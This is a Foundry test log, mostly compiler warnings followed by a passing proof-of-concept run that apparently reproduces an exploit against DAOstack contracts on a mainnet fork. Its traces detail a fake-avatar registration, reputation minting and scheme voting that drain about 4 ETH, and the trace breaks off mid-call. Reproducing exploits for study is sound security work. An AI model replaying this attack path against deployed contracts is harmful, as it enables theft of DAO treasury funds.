@@ -1,0 +1,636 @@
+Compiling 22 files with Solc 0.8.35
+Solc 0.8.35 finished in 597.44ms
+Compiler run successful with warnings:
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+  --> basetest.sol:87:5:
+   |
+87 |     modifier balanceLog() virtual {
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (8429): Virtual modifiers are deprecated and scheduled for removal.
+   --> basetest.sol:103:5:
+    |
+103 |     modifier balanceLog2(address target) virtual {
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1241:9:
+     |
+1241 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1255:9:
+     |
+1255 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1263:79:
+     |
+1263 |     function assertApproxEqAbs(uint256 left, uint256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                               ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1270:77:
+     |
+1270 |     function assertApproxEqAbs(int256 left, int256 right, uint256 maxDelta, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1287:9:
+     |
+1287 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1305:9:
+     |
+1305 |         string calldata error
+     |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1315:86:
+     |
+1315 |     function assertApproxEqRel(uint256 left, uint256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1326:84:
+     |
+1326 |     function assertApproxEqRel(int256 left, int256 right, uint256 maxPercentDelta, string calldata error)
+     |                                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1335:77:
+     |
+1335 |     function assertEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1342:75:
+     |
+1342 |     function assertEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1348:46:
+     |
+1348 |     function assertEq(bool left, bool right, string calldata error) external pure;
+     |                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1354:68:
+     |
+1354 |     function assertEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1360:66:
+     |
+1360 |     function assertEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1366:68:
+     |
+1366 |     function assertEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1372:74:
+     |
+1372 |     function assertEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1378:72:
+     |
+1378 |     function assertEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1387:74:
+     |
+1387 |     function assertEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1393:74:
+     |
+1393 |     function assertEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1399:72:
+     |
+1399 |     function assertEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                        ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1405:70:
+     |
+1405 |     function assertEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                      ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1408:52:
+     |
+1408 |     function assertEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1414:50:
+     |
+1414 |     function assertEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1420:52:
+     |
+1420 |     function assertEq(address left, address right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1426:52:
+     |
+1426 |     function assertEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1432:42:
+     |
+1432 |     function assertFalse(bool condition, string calldata error) external pure;
+     |                                          ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1440:77:
+     |
+1440 |     function assertGeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1448:75:
+     |
+1448 |     function assertGeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1455:52:
+     |
+1455 |     function assertGe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1462:50:
+     |
+1462 |     function assertGe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1470:77:
+     |
+1470 |     function assertGtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1478:75:
+     |
+1478 |     function assertGtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1485:52:
+     |
+1485 |     function assertGt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1492:50:
+     |
+1492 |     function assertGt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1500:77:
+     |
+1500 |     function assertLeDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1508:75:
+     |
+1508 |     function assertLeDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1515:52:
+     |
+1515 |     function assertLe(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1522:50:
+     |
+1522 |     function assertLe(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1530:77:
+     |
+1530 |     function assertLtDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1538:75:
+     |
+1538 |     function assertLtDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1545:52:
+     |
+1545 |     function assertLt(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                    ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1552:50:
+     |
+1552 |     function assertLt(int256 left, int256 right, string calldata error) external pure;
+     |                                                  ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1559:80:
+     |
+1559 |     function assertNotEqDecimal(uint256 left, uint256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1566:78:
+     |
+1566 |     function assertNotEqDecimal(int256 left, int256 right, uint256 decimals, string calldata error) external pure;
+     |                                                                              ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1572:49:
+     |
+1572 |     function assertNotEq(bool left, bool right, string calldata error) external pure;
+     |                                                 ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1578:71:
+     |
+1578 |     function assertNotEq(string calldata left, string calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1584:69:
+     |
+1584 |     function assertNotEq(bytes calldata left, bytes calldata right, string calldata error) external pure;
+     |                                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1590:71:
+     |
+1590 |     function assertNotEq(bool[] calldata left, bool[] calldata right, string calldata error) external pure;
+     |                                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1596:77:
+     |
+1596 |     function assertNotEq(uint256[] calldata left, uint256[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1602:75:
+     |
+1602 |     function assertNotEq(int256[] calldata left, int256[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1611:77:
+     |
+1611 |     function assertNotEq(address[] calldata left, address[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1617:77:
+     |
+1617 |     function assertNotEq(bytes32[] calldata left, bytes32[] calldata right, string calldata error) external pure;
+     |                                                                             ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1623:75:
+     |
+1623 |     function assertNotEq(string[] calldata left, string[] calldata right, string calldata error) external pure;
+     |                                                                           ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1629:73:
+     |
+1629 |     function assertNotEq(bytes[] calldata left, bytes[] calldata right, string calldata error) external pure;
+     |                                                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1632:55:
+     |
+1632 |     function assertNotEq(uint256 left, uint256 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1638:53:
+     |
+1638 |     function assertNotEq(int256 left, int256 right, string calldata error) external pure;
+     |                                                     ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1644:55:
+     |
+1644 |     function assertNotEq(address left, address right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1650:55:
+     |
+1650 |     function assertNotEq(bytes32 left, bytes32 right, string calldata error) external pure;
+     |                                                       ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
+    --> lib/forge-std/src/Vm.sol:1656:41:
+     |
+1656 |     function assertTrue(bool condition, string calldata error) external pure;
+     |                                         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (4591): There are more than 256 warnings. Ignoring the rest.
+
+Ran 2 tests for test/DAOstack_exp.sol:DAOstackExploitTest
+[PASS] testExploit() (gas: 2036939)
+Logs:
+  Attacker Before exploit ETH Balance: 0.000000000000000000
+  Attacker After exploit ETH Balance: 4.025577021548053172
+
+Traces:
+  [5960] DAOstackExploitTest::setUp()
+    ├─ [0] VM::createSelectFork("<rpc url>", 26059089 [2.605e7])
+    │   └─ ← [Return] 1
+    └─ ← [Stop]
+
+  [2096639] DAOstackExploitTest::testExploit()
+    ├─ [0] VM::deal(DAOstackExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit ETH Balance", val: 0, decimals: 18)
+    ├─ [2284] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9::totalSupply() [staticcall]
+    │   └─ ← [Return] 9738627137000000000000 [9.738e21]
+    ├─ [0] VM::assertEq(4025000000000000000 [4.025e18], 4025000000000000000 [4.025e18], "avatar treasury precondition") [staticcall]
+    │   └─ ← [Return]
+    ├─ [880161] → new DAOstackExploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 4396 bytes of code
+    ├─ [1148277] DAOstackExploit::run()
+    │   ├─ [303716] → new FakeAvatar@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   ├─ [12464] → new Stub@0x41C3c259514f88211c4CA2fd805A93F8F9A57504
+    │   │   │   └─ ← [Return] 62 bytes of code
+    │   │   ├─ [12464] → new Stub@0x0401911641c4781D93c41f9aa8094B171368E6a9
+    │   │   │   └─ ← [Return] 62 bytes of code
+    │   │   └─ ← [Return] 1066 bytes of code
+    │   ├─ [156989] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305::newOrganization(FakeAvatar: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
+    │   │   ├─ [402] FakeAvatar::owner()
+    │   │   │   └─ ← [Return] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305
+    │   │   ├─ [22813] FakeAvatar::nativeReputation()
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0: 0 → 1
+    │   │   │   └─ ← [Return] Stub: [0x41C3c259514f88211c4CA2fd805A93F8F9A57504]
+    │   │   ├─ [22859] FakeAvatar::nativeToken()
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 1: 0 → 1
+    │   │   │   └─ ← [Return] Stub: [0x0401911641c4781D93c41f9aa8094B171368E6a9]
+    │   │   ├─ [969] FakeAvatar::nativeToken()
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 1: 1 → 2
+    │   │   │   └─ ← [Return] 0xe30a71938b743d126E977A2b3F7450484F209a34
+    │   │   ├─ [923] FakeAvatar::nativeReputation()
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0: 1 → 2
+    │   │   │   └─ ← [Return] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9
+    │   │   ├─ [923] FakeAvatar::nativeReputation()
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0: 2 → 3
+    │   │   │   └─ ← [Return] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9
+    │   │   ├─ [969] FakeAvatar::nativeToken()
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 1: 2 → 3
+    │   │   │   └─ ← [Return] 0xe30a71938b743d126E977A2b3F7450484F209a34
+    │   │   ├─ emit RegisterScheme(param0: DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: FakeAvatar: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xae5114994edeb063f9615d2c830db1948ba958496a403ff91aea18673b0a0a5f: 0 → 31
+    │   │   │   @ 0x720e1b3d800394033de075a1fff553b62904feb588458fd6c44df09740b51a99: 0 → 0x0000000000000000000000006256294145fb529db7b248eb86b4e6ef30f55bf9
+    │   │   │   @ 0x720e1b3d800394033de075a1fff553b62904feb588458fd6c44df09740b51a98: 0 → 0x000000000000000000000000e30a71938b743d126e977a2b3f7450484f209a34
+    │   │   │   @ 0x720e1b3d800394033de075a1fff553b62904feb588458fd6c44df09740b51a9f: 0 → 1
+    │   │   └─ ← [Stop]
+    │   ├─ [39406] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305::mintReputation(20000000000000000000000 [2e22], DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], FakeAvatar: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
+    │   │   ├─ emit MintReputation(param0: DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 20000000000000000000000 [2e22], param3: FakeAvatar: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
+    │   │   ├─ [29579] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9::mint(DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 20000000000000000000000 [2e22])
+    │   │   │   ├─ emit Mint(to: DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 20000000000000000000000 [2e22])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0 → 0x00000000000000000000000000000000000000000000043c33c1937564800000
+    │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000020fee99d7a4c0691000 → 0x00000000000000000000000000000000000000000000064c225b6b1a24e91000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   └─ ← [Return] true
+    │   ├─ [322755] 0x781f48F300f9c2f4862347537927FC9Dc48415E0::proposeScheme(0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0, DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000000000000000000000000000, 0x0000001f)
+    │   │   ├─ [2588] 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0::owner()
+    │   │   │   └─ ← [Return] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305
+    │   │   ├─ [2722] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305::getSchemeParameters(0x781f48F300f9c2f4862347537927FC9Dc48415E0, 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0)
+    │   │   │   └─ ← [Return] 0x32896dcf957e38712dbd2aaf1b0c124f15d8f0e52a11a94949c47a0dd8b4ed5a
+    │   │   ├─ [232982] 0xFBaEf31bdEaCFA0a7902123005288784Dcc1EEba::propose(2, 0x5f0497643ffca224e98f82826ef3ba0d4ffd90358c3230a55e26c1923a564510, 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0, 0x781f48F300f9c2f4862347537927FC9Dc48415E0, DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   ├─ [588] 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0::owner()
+    │   │   │   │   └─ ← [Return] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305
+    │   │   │   ├─ [2722] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305::getSchemeParameters(0xFBaEf31bdEaCFA0a7902123005288784Dcc1EEba, 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0)
+    │   │   │   │   └─ ← [Return] 0x5f0497643ffca224e98f82826ef3ba0d4ffd90358c3230a55e26c1923a564510
+    │   │   │   ├─ emit NewProposal(param0: 0x0000000000000000000000000000000000000000000000000000000000000002, param1: 0xdEd45A4C4EFC01d88f3185E8f55522cA1eF4EcDE, param2: 685776570374514276829593625654645282369358271968 [6.857e47], param3: 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0, param4: 0x5f0497643ffca224e98f82826ef3ba0d4ffd90358c3230a55e26c1923a564510)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b94: 0 → 2
+    │   │   │   │   @ 4: 29 → 30
+    │   │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b95: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b96: 0 → 259200
+    │   │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b89: 0 → 0x0000000000000000000000007b11dfb29504abc8c0dfa60dc7e0aa2aae836db0
+    │   │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b8b: 0 → 0x000000000000000000000000781f48f300f9c2f4862347537927fc9dc48415e0
+    │   │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b8a: 0 → 2
+    │   │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b8f: 0 → 0x000000000000000000000000000000000000000000000000000000006ab742d3
+    │   │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b97: 0 → 0x5f0497643ffca224e98f82826ef3ba0d4ffd90358c3230a55e26c1923a564510
+    │   │   │   │   @ 0x6785aa2972de430dfba3abdfb58eb6f360e59613811f0be514e3a99a39f79b93: 0 → 3
+    │   │   │   └─ ← [Return] 0x6b34ec08ce78284940808ce0ded45a4c4efc01d88f3185e8f55522ca1ef4ecde
+    │   │   ├─ emit NewSchemeProposal(param0: 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0, param1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f, param2: 0xdEd45A4C4EFC01d88f3185E8f55522cA1eF4EcDE, param3: 0xFBaEf31bdEaCFA0a7902123005288784Dcc1EEba, param4: 0x0000000000000000000000000000000000000000000000000000000000000000, param5: 0x0000001f)
+    │   │   ├─ [531] 0xFBaEf31bdEaCFA0a7902123005288784Dcc1EEba::ownerVote(0x6b34ec08ce78284940808ce0ded45a4c4efc01d88f3185e8f55522ca1ef4ecde, 1, DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xf5824cf3cdfaae568bdff50ac4b047047d236e8ec7b37715816675b770a67eb0: 0 → 31
+    │   │   │   @ 0xf5824cf3cdfaae568bdff50ac4b047047d236e8ec7b37715816675b770a67eaf: 0 → 1
+    │   │   │   @ 0xf5824cf3cdfaae568bdff50ac4b047047d236e8ec7b37715816675b770a67ead: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   └─ ← [Return] 0x6b34ec08ce78284940808ce0ded45a4c4efc01d88f3185e8f55522ca1ef4ecde
+    │   ├─ [261824] 0xFBaEf31bdEaCFA0a7902123005288784Dcc1EEba::vote(0x6b34ec08ce78284940808ce0ded45a4c4efc01d88f3185e8f55522ca1ef4ecde, 1)
+    │   │   ├─ [2544] 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0::nativeReputation()
+    │   │   │   └─ ← [Return] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9
+    │   │   ├─ [284] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9::totalSupply()
+    │   │   │   └─ ← [Return] 29738627137000000000000 [2.973e22]
+    │   │   ├─ [544] 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0::nativeReputation()
+    │   │   │   └─ ← [Return] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9
+    │   │   ├─ [638] 0x6256294145fb529dB7B248Eb86b4E6ef30F55BF9::reputationOf(DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   └─ ← [Return] 20000000000000000000000 [2e22]
+    │   │   ├─ [588] 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0::owner()
+    │   │   │   └─ ← [Return] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305
+    │   │   ├─ [16784] 0xD5bEe5D9Ae589094c51e533f35656963fdA87305::burnReputation(200000000000000000000 [2e20], DAOstackExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x7b11dFb29504abc8C0DFa60DC7E0Aa2AAe836DB0)
